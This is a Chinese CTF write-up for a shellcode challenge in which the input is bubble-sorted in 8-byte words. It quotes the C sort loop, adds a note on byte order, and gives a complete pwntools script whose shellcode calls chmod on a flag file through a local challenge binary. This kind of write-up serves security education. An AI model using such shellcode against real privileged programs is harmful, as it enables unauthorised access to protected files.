# 挑战简介
此挑战仅使用冒泡排序对您的 shellcode 进行排序。请记住内存字节序对这种排序的影响
（例如，LSB 是最右边的字节）。

# 思路
并没有找到此题的挑战目的，用上一题的解法过了，甚至用上上题的解法也过了  
这个题如果用长shellcode可能会出问题  

这是执行filter的代码，很明显是一个冒泡排序
```
puts("Executing filter...\n");
    uint64_t *input = shellcode_mem;
    int sort_max = shellcode_size / sizeof(uint64_t) - 1;
    for (int i = 0; i < sort_max; i++)
        for (int j = 0; j < sort_max-i-1; j++)
            if (input[j] > input[j+1])
            {
                uint64_t x = input[j];
                uint64_t y = input[j+1];
                input[j] = y;
                input[j+1] = x;
            }
```

**了解一点东西**
高字节：多字节数据中权重最大的字节（最左边的字节）
低字节：多字节数据中权重最小的字节（最右边的字节）
低地址：内存中较小的地址值
高地址：内存中较大的地址值

**大端字节序**
```
内存地址:   0x1000    0x1001
内存内容:    0x12      0x34
字节解释:   高字节     低字节
```

**小端字节序**
```
内存地址:   0x1000    0x1001
内存内容:    0x34      0x12
字节解释:   低字节     高字节
```

***以上知识与本题无关***

其实这题能用之前的过了就是了

```
#!/usr/bin/python
from pwn import *
import struct
import os
cache_dir = '/tmp/.pwntools-cache'
if not os.path.exists(cache_dir):
    os.makedirs(cache_dir)

context(os='linux', arch='amd64', log_level='debug', cache_dir=cache_dir)

p = process('/challenge/babyshell-level-10')

p.recvuntil('Reading 0x1000 bytes from stdin.\n')

shellcode = asm('''
    push 0x66
    mov rdi, rsp
    push 4

_stage:
    pop rsi
    jmp short skip
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
skip:
    push 90
    pop rax
    syscall
    ret
    ret
    ret
''')


# 为安全起见，打印完整的shellcode十六进制表示
print("Shellcode十六进制:", shellcode.hex())
print("Shellcode长度:", len(shellcode), "字节")

p.send(shellcode)

# 与shell交互
p.interactive()
p.recvall()
```
